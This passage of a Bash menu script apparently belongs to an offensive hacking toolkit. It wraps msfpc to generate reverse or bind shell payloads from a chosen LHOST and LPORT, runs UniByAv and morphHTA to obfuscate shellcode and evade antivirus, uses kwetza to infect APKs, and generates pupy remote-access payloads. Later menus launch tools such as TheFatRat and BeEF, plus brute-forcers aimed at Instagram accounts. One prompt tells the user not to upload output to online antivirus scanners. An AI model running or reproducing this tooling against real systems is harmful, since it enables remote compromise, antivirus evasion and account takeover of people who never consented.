		if [[ -f /usr/bin/msfpc ]]
		then
			while true
			do
				clear
				echo -e ""$YS" 1"$CE") APK"
				echo -e ""$YS" 2"$CE") ASP"
				echo -e ""$YS" 3"$CE") ASPX"
				echo -e ""$YS" 4"$CE") Bash [.sh]"
				echo -e ""$YS" 5"$CE") Java [.jsp]"
				echo -e ""$YS" 6"$CE") Linux [.elf]"
				echo -e ""$YS" 7"$CE") OSX [.macho]"
				echo -e ""$YS" 8"$CE") Perl [.pl]"
				echo -e ""$YS" 9"$CE") PHP"
				echo -e ""$YS"10"$CE") Powershell [.ps1]"
				echo -e ""$YS"11"$CE") Python [.py]"
				echo -e ""$YS"12"$CE") Tomcat [.war]"
				echo -e ""$YS"13"$CE") Windows [.exe // .dll]"
				echo -e ""$YS"ENTER"$CE") Windows [.exe // .dll]"
				echo -e ""
				echo -e "Choose: "	
				read TYPE
				if [[ "$TYPE" -le 13 && "$TYPE" -ge 1 ]]
				then
					if [[ "$TYPE" = 1 ]]
					then
						MTYPE="APK"
					elif [[ "$TYPE" = 2 ]]
					then
						MTYPE="ASP"
					elif [[ "$TYPE" = 3 ]]
					then
						MTYPE="ASPX"
					elif [[ "$TYPE" = 4 ]]
					then
						MTYPE="bash"
					elif [[ "$TYPE" = 5 ]]
					then
						MTYPE="java"
					elif [[ "$TYPE" = 6 ]]
					then
						MTYPE="linux"
					elif [[ "$TYPE" = 7 ]]
					then
						MTYPE="OSX"
					elif [[ "$TYPE" = 8 ]]
					then
						MTYPE="perl"
					elif [[ "$TYPE" = 9 ]]
					then
						MTYPE="PHP"
					elif [[ "$TYPE" = 10 ]]
					then
						MTYPE="powershell"
					elif [[ "$TYPE" = 11 ]]
					then
						MTYPE="python"		
					elif [[ "$TYPE" = 12 ]]
					then
						MTYPE="tomcat"
					elif [[ "$TYPE" = 13 ]]
					then
						MTYPE="windows"																																																															
					fi
				else
					if [[ "$TYPE" = "" ]]
					then
						MTYPE="windows"
					else
						echo -e ""$RS"Wrong choise"$CE""
						sleep 1
						clear
						continue
					fi
				fi
				clear
				echo -e "LHOST: "
				read MLHOST
				clear
				echo -e "LPORT: "
				read MLPORT
				clear
				echo -e ""$YS" 1"$CE") CMD                      Smaller size but less features"
				echo -e ""$YS" 2"$CE") MSF                      Bigger size but more features"
				echo -e ""$YS"ENTER"$CE") MSF"
				echo -e "Choose: "
				read CMDMSF
				if [[ "$CMDMSF" = 1 ]]
				then
					MCMDMSF="CMD"
				else
					MCMDMSF="MSF"
				fi
				clear
				echo -e ""$YS" 1"$CE") Bind"
				echo -e ""$YS" 2"$CE") Reverse"
				echo -e ""$YS"ENTER"$CE") Reverse"
				echo -e "Choose: "
				read BR
				if [[ "$BR" = 1 ]]
				then
					MBR="BIND"
				else
					MBR="REVERSE"
				fi
				clear
				echo -e ""$YS" 1"$CE") Staged"
				echo -e ""$YS" 2"$CE") Stageless"
				echo -e ""$YS"ENTER"$CE") Staged"
				echo -e "Choose: "	
				read SORS
				if [[ "$SORS" = 2 ]]
				then
					MSORS="STAGELESS"
				else
					MSORS="STAGED"
				fi
				clear
				echo -e ""$YS" 1"$CE") TCP"
				echo -e ""$YS" 2"$CE") HTTP"
				echo -e ""$YS" 3"$CE") HTTPS"
				echo -e ""$YS" 4"$CE") FIND_PORT"
				echo -e ""$YS"ENTER"$CE") TCP"
				echo -e "Choose: "
				read PRT
				if [[ "$PRT" = 2 ]]
				then
					MPRT="HTTP"
				elif [[ "$PRT" = 3 ]]
				then
					MPRT="HTTPS"
				elif [[ "$PRT" = 4 ]]
				then
					MPRT="FIND_PORT"
				else
					MPRT="TCP"
				fi
				clear
				msfpc $MTYPE $MLHOST $MLPORT $MCMDMSF $MBR $MSORS $MPRT
				break
			done
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_msfpc
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "20" ]]
	then
		if [[ -d /root/morphHTA ]]
		then
			while true 
			do
				clear
				echo -e "Your file's path: "
				read FPATH
				if [[ ! -f "$FPATH" ]]
				then
					echo -e ""$RS"File does not exist"$CE""
					sleep 2
					continue
				fi
				clear
				echo -e ""$YS" 1"$CE") MSHTA"
				echo -e ""$YS" 2"$CE") Explorer"
				echo -e ""$YS" 3"$CE") WmiPrvSE"
				echo -e ""$YS"ENTER"$CE") Explorer"
				echo -e "Choose technique to use:: "
				read MODE
				if [[ "$MODE" = 1 ]]
				then
					MMODE="mshta"
				elif [[ "$MODE" = 3 ]]
				then
					MMODE="wmiprvse"
				else
					MMODE="explorer"
				fi
				clear
				echo -e "Enter max length of randomly generated strings: "
				echo -e ""$YS"ENTER"$CE") 1000"
				read M1
				if [[ "$M1" = "" ]]
				then
					M1=1000
				fi
				clear
				echo -e "Enter max length of randomly generated variable names: "
				echo -e ""$YS"ENTER"$CE") 40"
				read M2
				if [[ "$M2" = "" ]]
				then
					M2=40
				fi
				clear
				echo -e "Enter max number of times values should be split in chr obfuscation: "
				echo -e ""$YS"ENTER"$CE") 10"
				read M3
				if [[ "$M3" = "" ]]
				then
					M3=10
				fi
				clear
				echo -e "Enter value of each split: "
				echo -e ""$YS"ENTER"$CE") 10"
				read M4
				if [[ "$M4" = "" ]]
				then
					M4=10
				fi
				while true
				do
					clear
					echo -e "Enter file to output the morphed HTA to: "
					echo -e ""$YS"ENTER"$CE") /root/Desktop/morph.HTA"
					read M5
					if [[ "$M5" = "" ]]
					then
						M5="/root/Desktop/morph.HTA"
					fi
					if [[ -f "$M5" ]]
					then
						echo -e ""$RS"File already exists"$CE""
						sleep 3
						continue
					else
						break
					fi
				done
				break
			done
				clear
				cd /root/morphHTA
				python morph-hta.py --in "$FPATH" --out "$M5" --mode "$M1" --maxstrlen "$M2" --maxvarlen "$M3" --maxnumsplit "$M4"
				cd
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_morphhta
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "21" ]]
	then
		if [[ -d /root/LFISuite ]]
		then
			cd /root/LFISuite
			python lfisuite.py
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_lfi
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "22" ]]
	then
		if [[ -d /root/UniByAv ]]
		then
			while true
			do
				clear
				echo -e "Path to raw shellcode file you want to use: "
				read RPATH
				if [[ ! -f "$RPATH" ]]
				then
					echo -e ""$RS"File not found"$CE""
					sleep 2
					continue
				fi
				clear
				echo -e "Name of output file: "
				read OUT
				if [[ -f "$OUT" ]]
				then
					echo -e ""$RS"File already exists"$CE""
					sleep 2
					continue
				fi
				clear
				echo -e "Bypass Antivirus or just generate executable?"
				echo -e ""$YS" 1"$CE") Bypass"
				echo -e ""$YS" 2"$CE") Just generate"
				echo -e ""$YS"ENTER"$CE") Bypass"
				echo -e "Choose: "
				read BORG
				clear
				if [[ "$BORG" = 2 ]]
				then
						echo -e ""$YS" 1"$CE") domain.json"
						echo -e ""$YS" 2"$CE") process-and-time-evasion.json"
						echo -e ""$YS" 3"$CE") process-evasion.json"
						echo -e ""$YS"ENTER"$CE") process-evasion.json"
						echo -e "Choose: "
						read CONF
						if [[ "$CONF" = 1 ]]
						then
							FC="domain.json"
						elif [[ "$CONF" = 2 ]]
						then
							FC="process-and-time-evasion.json"
						else
							FC="process-evasion.json"
						fi
						cd /root/UniByAv
						python UniByAv*.py "$RPATH" "$OUT" none /root/UniByAv/configs/"$FC"
						break
				else
					#~ GCC=$(which gcc)
					#~ if [[ "$GCC" = "" ]]
					#~ then
						#~ echo -e ""$RS"gcc not found on your system"$CE""
						#~ sleep 2
						#~ echo -e "Proceeding without bypassing Antivirus..."
						#~ sleep 3
						#~ clear
						#~ echo -e ""$YS" 1"$CE") domain.json"
						#~ echo -e ""$YS" 2"$CE") process-and-time-evasion.json"
						#~ echo -e ""$YS" 3"$CE") process-evasion.json"
						#~ echo -e ""$YS"ENTER"$CE") process-evasion.json"
						#~ echo -e "Choose: "
						#~ read CONF
						#~ if [[ "$CONF" = 1 ]]
						#~ then
							#~ FC="domain.json"
						#~ elif [[ "$CONF" = 2 ]]
						#~ then
							#~ FC="process-and-time-evasion.json"
						#~ else
							#~ FC="process-evasion.json"
						#~ fi
						#~ cd /root/UniByAv
						#~ python UniByAv*.py "$RPATH" "$OUT" none /root/UniByAv/configs/"$FC"
						#~ break
					#~ else
						echo -e "Path to mingw32-gcc.exe : "
						read PGCC
						#~ if [[ "$PGCC" = "" ]]
						#~ then
							#~ PGCC="$GCC"
						#~ fi
						clear
						echo -e ""$YS" 1"$CE") domain.json"
						echo -e ""$YS" 2"$CE") process-and-time-evasion.json"
						echo -e ""$YS" 3"$CE") process-evasion.json"
						echo -e ""$YS"ENTER"$CE") process-evasion.json"
						echo -e "Choose: "
						read CONF
						if [[ "$CONF" = 1 ]]
						then
							FC="domain.json"
						elif [[ "$CONF" = 2 ]]
						then
							FC="process-and-time-evasion.json"
						else
							FC="process-evasion.json"
						fi
						cd /root/UniByAv
						python UniByAv*.py "$RPATH" "$OUT" "$PGCC" /root/UniByAv/configs/"$FC"
						break
					#~ fi
				fi	
			done
			cd /root/UniByAv
			python UniByAv*.py
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_unibyav
			else
				continue
			fi
		fi
	
	elif [[ "$KEYLOG" = "23" ]]
	then
		if [[ -d /root/demiguise ]]
		then
			while true
			do
				clear
				echo -e "Encryption key: "
				read ENC
				clear
				echo -e ""$YS" 1"$CE") ShellBrowserWindow"
				echo -e ""$YS" 2"$CE") Outlook.Application"
				echo -e ""$YS" 3"$CE") Excel.RegisterXLL"
				echo -e ""$YS" 4"$CE") WbemScripting.SWbemLocator"
				echo -e "Choose payload type: "
				read PT
				if [[ "$PT" -le 4 && "$PT" -ge 1 ]]
				then
					if [[ "$PT" = 1 ]]
					then
						PTT="ShellBrowserWindow"
					elif [[ "$PT" = 2 ]]
					then
						PTT="Outlook.Application"
					elif [[ "$PT" = 3 ]]
					then
						PTT="Excel.RegisterXLL"
					elif [[ "$PT" = 4 ]]
					then
						PTT="WbemScripting.SWbemLocator"
					fi
					clear
					echo -e "Command to run from HTA: "
					read CHTA
					if [[ "$CHTA" = "" ]]
					then
						CCHTA=""
					else
						CCHTA="-c "$CHTA""
					fi
					clear
					echo -e "Output file name: "
					read FN
					cd /root/demiguise
					python demiguise.py -k "$ENC" -p "$PTT" "$CCHTA" -o "$FN"
					if [[ -f /root/demiguise/$FN ]]
					then
						echo -e "Output file: /root/demiguise/"$FN""
					else
						if [[ -f /root/demiguise/$FN.html ]]
						then
							echo -e "Output file: /root/demiguise/"$FN".html"
						fi
					fi					
					break
				else
					echo -e ""$RS"Wrong choise"$CE""
					sleep 2
					continue
				fi
			done
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_demiguise
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "24" ]]
	then
		if [[ -d /root/DKMC ]]
		then
			cd /root/DKMC
			python dkmc.py
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_dkmc
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "25" ]]
	then
		if [[ -d /usr/share/beef-xss ]]
		then
			cd /usr/share/beef-xss
			./beef
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_beef
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "26" ]]
	then
		if [[ -d /root/Evil-Droid ]]
		then
			cd /root/Evil-Droid
			./evil-droid
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_evil_droid
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "27" ]]
	then
		if [[ -d /root/EggShell ]]
		then
			cd /root/EggShell
			python eggshell.py
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_eggshell
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "28" ]]
	then
		if [[ -d /root/Zerodoor ]]
		then
			cd /root/Zerodoor
			python zerodoor.py
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_zerodoor
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "29" ]]
	then
		if [[ -d /root/cromos ]]
		then
			cd /root/cromos
			cromos_menu
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_cromos
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "30" ]]
	then
		if [[ -d /root/AutoSploit ]]
		then
			cd /root/AutoSploit
			python autosploit.py
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_autosploit
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "31" ]]
	then
		if [[ -d /root/Enigma ]]
		then
			cd /root/Enigma
			python enigma.py
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_enigma
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "8" ]]
	then
		if [[ -d /root/CHAOS ]]
		then
			cd /root/CHAOS
			go run CHAOS.go
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_chaos
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "9" ]]
	then
		if [[ -d /root/kwetza ]]
		then
			cd /root/kwetza
			printf '\033]2;KWETZA\a'
			while true
			do
				clear
				if [[ "$APK" = "" ]]
				then
					APK="\e[1;31mNONE\e[m"
				fi
				if [[ "$APKLH" = "" ]]
				then
					APKLH="\e[1;31mNONE\e[m"
				fi
				if [[ "$APKLP" = "" ]]
				then
					APKLP="\e[1;31mNONE\e[m"
				fi
				if [[ "$APKPROT" = "" ]]
				then
					APKPROT="tcp"
				fi
				if [[ "$APKPERM" = "" ]]
				then
					APKPERM="yes"
				fi
				echo -e ""$YS" 1"$CE") Apk to infect                      CURRENT:$APK"
				echo -e ""$YS" 2"$CE") LHOST                              CURRENT:$APKLH"
				echo -e ""$YS" 3"$CE") LPORT                              CURRENT:$APKLP"
				echo -e ""$YS" 4"$CE") Protocol                           CURRENT:$APKPROT"
				echo -e ""$YS" 5"$CE") Add additional permissions         CURRENT:$APKPERM"
				echo -e ""$YS" b"$CE") Go back"
				echo -e ""$YS" run"$CE") Infect apk"
				echo -e "Choose: "
				read APKK
				clear
				if [[ "$APKK" = 1 ]]
				then
					echo -e "Apk to infect(must be in /root/kwetza): "
					read APKTBI
					if [[ -f "$APKTBI" ]]
					then
						APK="$APKTBI"
					else
						echo -e ""$RS"/root/kwetza/"$APKTBI" not found"$CE""
						sleep 3
					fi
				elif [[ "$APKK" = 2 ]]
				then
					echo -e "LHOST: "
					read APKLH
				elif [[ "$APKK" = 3 ]]
				then
					echo -e "LPORT: "
					read APKLP
				elif [[ "$APKK" = 4 ]]
				then
					if [[ "$APKPROT" = "tcp" ]]
					then
						APKPROT="https"
					else
						APKPROT="tcp"
					fi
				elif [[ "$APKK" = 5 ]]
				then
					if [[ "$APKPERM" = "yes" ]]
					then
						APKPERM="no"
					else
						APKPERM="yes"
					fi
				elif [[ "$APKK" = "back" || "$APKK" = "b" ]]
				then
					break
				elif [[ "$APKK" = "run" ]]
				then
					if [[ "$APK" = "\e[1;31mNONE\e[m" ]]
					then
						echo -e ""$RS"No apk specified."$CE""
						sleep 3
						continue
					fi
					if [[ "$APKLH" = "\e[1;31mNONE\e[m" ]]
					then
						echo -e ""$RS"No LHOST specified."$CE""
						sleep 3
						continue
					fi
					if [[ "$APKLP" = "\e[1;31mNONE\e[m" ]]
					then
						echo -e ""$RS"No LPORT specified."$CE""
						sleep 3
						continue
					fi
					cd /root/kwetza
					python kwetza.py $APK $APKLH $APKPROT $APKLP $APKPERM
					echo -e "$PAKTGB"
					$READAK
				fi
			done
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_kwetza
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "7" ]]
	then
		if [[ -f /usr/bin/shellter ]]
		then
			shellter
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_shellter
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "2" ]]
	then
		if [[ -d /root/ezsploit ]]
		then
			cd /root/ezsploit/
			./ezsploit.sh
			cd
			echo -e "Go to metasploit menu to create a listener(Option "$YS"14"$CE")"
			sleep 2
			echo -e "Press "$YS"any key"$CE" to leave..."
			$READAK
			exec bash "$0"
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_ezsploit
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "3" ]]
	then
		if [[ -d /root/pupy ]]
		then
			while true
			do
			clear
			echo -e ""$YS" 1"$CE") Generate a payload"
			echo -e ""$YS" 2"$CE") Start listener"
			echo -e ""$YS" b"$CE") Go back"
			echo -e ""$YS"00"$CE") Main menu"
			echo -e ""$YS" 0"$CE") EXIT"
			read -e PUPY
			if [[ "$PUPY" = "1" ]]
			then
				clear
				echo -e "Choose the target OS:"
				echo -e ""$YS" 1"$CE") Windows"
				echo -e ""$YS" 2"$CE") Linux"
				echo -e ""$YS" 3"$CE") Android"
				echo -e "Choose: "
				read -e TAROS
				if [[ "$TAROS" = "1" ]]
				then
					TAROS="windows"
				elif [[ "$TAROS" = "2" ]]
				then
					TAROS="linux"
				elif [[ "$TAROS" = "3" ]]
				then
					TAROS="android"
				else
					echo -e "Wrong choice.Returning to main manu..."
					sleep 2
					exec bash "$0"
				fi
				clear
				echo -e "Enter your ip: "
				read -e PUPYIP
				clear
				echo -e "Enter your port(e.g: 443): "
				read -e PUPYPORT
				clear
				echo -e "Enter the full output path(e.g: /root/Desktop/payload1.exe)"
				read -e PUPYPATH
				cd /root/pupy/pupy
				./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
				cd
			elif [[ "$PUPY" = "2" ]]
			then
				cd /root/pupy/pupy
				./pupysh.py
			elif [[ "$PUPY" = "00" ]]
			then
				exec bash "$0"
			elif [[ "$PUPY" = "back" || "$PUPY" = "b" ]]
			then
				break
			elif [[ "$PUPY" = "0" ]]
			then
				exit
			fi
			done
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_pupy
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "4" ]]
	then
		if [[ -d /root/zirikatu ]]
		then
			clear
			echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
			sleep 3
			echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
			read MUSTBEYES
			if [[ "$MUSTBEYES" = "YES" ]] 
			then 
				clear
				cd /root/zirikatu
				./zirikatu.sh
				cd
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_zirikatu
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "5" ]]
	then
		if [[ -d /root/TheFatRat ]]
		then
			fatrat
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_thefatrat
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "6" ]]
	then
		if [[ -d /root/Winpayloads ]]
		then
			cd /root/Winpayloads
			./WinPayloads.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_winpayloads
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$KEYLOG" = "0" ]]
	then
		clear
		exit
	elif [[ "$KEYLOG" = "back" || "$KEYLOG" = "b" ]]
	then
		break
	fi
	echo -e "$PAKTGB"
	$READAK
	done
}
function information_gathering
{
	while true 
	do
		clear
		TERMINALTITLE="INFORMATION GATHERING"
		dash_calc
		printf '\033]2;INFORMATION GATHERING\a'
		if [[ -d /usr/share/sniper ]]
		then
			echo -e ""$YS" 1"$CE") Sniper                Automated Pentest Recon Scanner"
		else
			echo -e ""$RS" 1"$CE") "$RS"Sniper"$CE"                Automated Pentest Recon Scanner"
		fi
		if [[ -d /root/ReconDog ]]
		then
			echo -e ""$YS" 2"$CE") ReconDog              All in one tool"
		else
			echo -e ""$RS" 2"$CE") "$RS"ReconDog"$CE"              All in one tool"
		fi
		if [[ -d /root/RED_HAWK ]]
		then
			echo -e ""$YS" 3"$CE") RED HAWK              All in one tool"
		else
			echo -e ""$RS" 3"$CE") "$RS"RED HAWK"$CE"              All in one tool"
		fi
		if [[ -d /root/Infoga ]]
		then
			echo -e ""$YS" 4"$CE") Infoga                Email Information Gathering"
		else
			echo -e ""$RS" 4"$CE") "$RS"Infoga"$CE"                Email Information Gathering"
		fi
		if [[ -d /root/KnockMail ]]
		then
			echo -e ""$YS" 5"$CE") KnockMail             Verify if email exists"
		else
			echo -e ""$RS" 5"$CE") "$RS"KnockMail"$CE"             Verify if email exists"
		fi
		if [[ -d /root/operative-framework ]]
		then
			echo -e ""$YS" 6"$CE") Operative-framework   Get information on website or target"
		else
			echo -e ""$RS" 6"$CE") "$RS"Operative-framework"$CE"   Get information on website or target"
		fi
		if [[ -d /root/osrframework ]]
		then
			echo -e ""$YS" 7"$CE") Osrfconsole           Perform accurate online researches"
		else
			echo -e ""$RS" 7"$CE") "$RS"Osrfconsole"$CE"           Perform accurate online researches"
		fi
		echo -e ""$YS" b"$CE") Go back"
		echo -e ""$YS"00"$CE") Main menu"
		echo -e "Choose: "
		read INFOG
		clear
		if [[ "$INFOG" = 1 ]]
		then
			if [[ -d /usr/share/sniper ]]
			then
				echo -e "Enter the domain you want to scan: "
				read DOMAIN
				clear
				sniper $DOMAIN
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_sniper
				else
					continue
				fi
			fi
		elif [[ "$INFOG" = 2 ]]
		then
			if [[ -d /root/ReconDog ]]
			then
				cd /root/ReconDog
				python dog.py
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_recondog
				else
					continue
				fi
			fi
		elif [[ "$INFOG" = 3 ]]
		then
			if [[ -d /root/RED_HAWK ]]
			then
				cd /root/RED_HAWK
				php rhawk.php
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_redhawk
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = 4 ]]
		then
			if [[ -d /root/Infoga ]]
			then
				echo -e "Domain to search:"
				read INFOTARG
				echo -e "Data source(e.g. "$YS"all"$CE","$YS"google"$CE","$YS"bing"$CE","$YS"yahoo"$CE","$YS"pgp"$CE"): "
				read INFOSOUR
				clear
				cd /root/Infoga
				python infoga.py -t $INFOTARG -s $INFOSOUR 
				echo -e "$PAKTGB"
				$READAK
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_infoga
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = 5 ]]
		then
			if [[ -d /root/KnockMail ]]
			then
				clear
				cd /root/KnockMail
				python2.7 knock.py
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_knockmail
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = 6 ]]
		then
			if [[ -d /root/operative-framework ]]
			then
				clear
				cd /root/operative-framework
				python2.7 operative.py
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_operative
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = "7" ]]
		then
			if [[ -d "/root/hakkuframework" ]]
			then
				while true
				do
					printf '\033]2;OSRFCONSOLE\a'
					clear
					echo -e ""$YS" 1"$CE") usufy"
					echo -e ""$YS" 2"$CE") mailfy"
					echo -e ""$YS" 3"$CE") searchfy"
					echo -e ""$YS" 4"$CE") domainfy"
					echo -e ""$YS" 5"$CE") phonefy"
					echo -e ""$YS" 6"$CE") entify"
					echo -e ""$YS" b"$CE") Go back"
					echo -e ""$YS"00"$CE") Main menu"
				#	echo -e ""$YS" 0"$CE") EXIT"
					echo -e "Choose: "
					read -e OSFR
					clear
					if [[ "$OSFR" = "1" ]]
					then
						echo -e "Use: usufy.py -n name1 name2 -p twitter facebook"
						usufy.py
						exit
					elif [[ "$OSFR" = "2" ]]
					then
						echo -e "Use: mailfy.py -n name1"
						mailfy.py
						exit
					elif [[ "$OSFR" = "3" ]]
					then
						searchfy.py
						exit
					elif [[ "$OSFR" = "4" ]]
					then
						domainfy.py
						exit
					elif [[ "$OSFR" = "5" ]]
					then
						phonefy.py
						exit
					elif [[ "$OSFR" = "6" ]]
					then
						entify.py
						exit
					elif [[ "$OSFR" = "0" ]]
					then
						exit
					elif [[ "$OSFR" = "00" ]]
					then
						exec bash "$0"
					elif [[ "$OSFR" = "back" || "$OSFR" = "b" ]]
					then
						break
					else 
						echo -e "Wrong choice"
						sleep 0.3
						clear
						exec bash "$0"
					fi
				done
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_osrframework
				else
					continue
				fi
			fi
		elif [[ "$INFOG" = 0 ]]
		then
			exit
		elif [[ "$INFOG" = 00 ]]
		then
			exec bash $0
		elif [[ "$INFOG" = "back" || "$INFOG" = "b" ]]
		then
			break
		fi
		echo -e "$PAKTGB"
		$READAK
	done
}
function website_tools
{
	while true 
	do
		clear
		TERMINALTITLE="WEBSITE TOOLS"
		dash_calc
		printf '\033]2;WEBSITE TOOLS\a'
		if [[ -f /usr/bin/sqlmap ]]
		then
			echo -e ""$YS" 1"$CE") SQLmap                Automatic SQL injection and database takeover tool"
		else
			echo -e ""$RS" 1"$CE") "$RS"SQLmap"$CE"                Automatic SQL injection and database takeover tool"
		fi
		if [[ -d /root/leviathan ]]
		then
			echo -e ""$YS" 2"$CE") Leviathan             Wide range mass audit toolkit"
		else
			echo -e ""$RS" 2"$CE") "$RS"Leviathan"$CE"             Wide range mass audit toolkit"
		fi
		if [[ -d /root/NoSQLMap ]]
		then
			echo -e ""$YS" 3"$CE") NoSQLMap              Automated NoSQL exploitation tool"
		else
			echo -e ""$RS" 3"$CE") "$RS"NoSQLMap"$CE"              Automated NoSQL exploitation tool"
		fi
		if [[ -d /root/Yuki-Chan-The-Auto-Pentest ]]
		then
			echo -e ""$YS" 4"$CE") Yuki Chan             Automated Pentest Tool"
		else
			echo -e ""$RS" 4"$CE") "$RS"Yuki Chan"$CE"             Automated Pentest Tool"
		fi
		if [[ -d /root/Blazy ]]
		then
			echo -e ""$YS" 5"$CE") Blazy                 Login bruteforcer/tests for CSRF, Cj, Cloudflare, WAF"
		else
			echo -e ""$RS" 5"$CE") "$RS"Blazy"$CE"                 Login bruteforcer/tests for CSRF, Clickjacking, Cloudflare and WAF"
		fi
		if [[ -d /root/Striker ]]
		then
			echo -e ""$YS" 6"$CE") Striker               An offensive information and vulnerability scanner"
		else
			echo -e ""$RS" 6"$CE") "$RS"Striker"$CE"               An offensive information and vulnerability scanner"
		fi
		if [[ -d /root/hyprPulse ]]
		then
			echo -e ""$YS" 7"$CE") HyprPulse             Brute force multiple accounts at once"
		else
			echo -e ""$RS" 7"$CE") "$RS"HyprPulse"$CE"             Brute force multiple accounts at once"
		fi
		if [[ -d /root/hyprPulse ]]
		then
			echo -e ""$YS" 8"$CE") InstaBurst            A faster way to brute force Instagram"
		else
			echo -e ""$RS" 8"$CE") "$RS"InstaBurst"$CE"             A faster way to brute force Instagram"
		fi
		if [[ -f /usr/local/bin/instagram-py ]]
		then
			echo -e ""$YS" 9"$CE") Instagram-py          Brute force Instagram without password limiting"
		else
			echo -e ""$RS" 9"$CE") "$RS"Instagram-py"$CE"          Brute force Instagram without password limiting"
		fi
		if [[ -d /root/datasploit ]]
		then
			echo -e ""$YS"10"$CE") Datasploit            Recon on Companies, People, Phone, Bitcoin..."
		else
			echo -e ""$RS"10"$CE") "$RS"Datasploit"$CE"            Recon on Companies, People, Phone, Bitcoin..."
		fi
		if [[ -d /root/SiteBroker ]]
		then
			echo -e ""$YS"11"$CE") SiteBroker            Utility to penetrate and test websites"
		else
			echo -e ""$RS"11"$CE") "$RS"SiteBroker"$CE"            Utility to penetrate and test websites"
		fi
		echo -e ""$YS" b"$CE") Go back"
		echo -e ""$YS"00"$CE") Main menu"
		echo -e "Choose: "
		read WEB
		clear
		if [[ "$WEB" = 1 ]]
		then
			if [[ -f /usr/bin/sqlmap ]]
			then
				sqlmap_menu
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_sqlmap
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 2 ]]
		then
			if [[ -d /root/leviathan ]]
			then
				cd /root/leviathan
				python leviathan.py
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_leviathan
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 3 ]]
		then
			if [[ -d /root/NoSQLMap ]]
			then
				cd /root/NoSQLMap
				python nosqlmap.py
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_nosqlmap
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 4 ]]
		then
			if [[ -d /root/Yuki-Chan-The-Auto-Pentest ]]
			then
				cd /root/Yuki-Chan-The-Auto-Pentest
				./yuki.sh
				echo -e "$PAKTGB"
				$READAK
			else
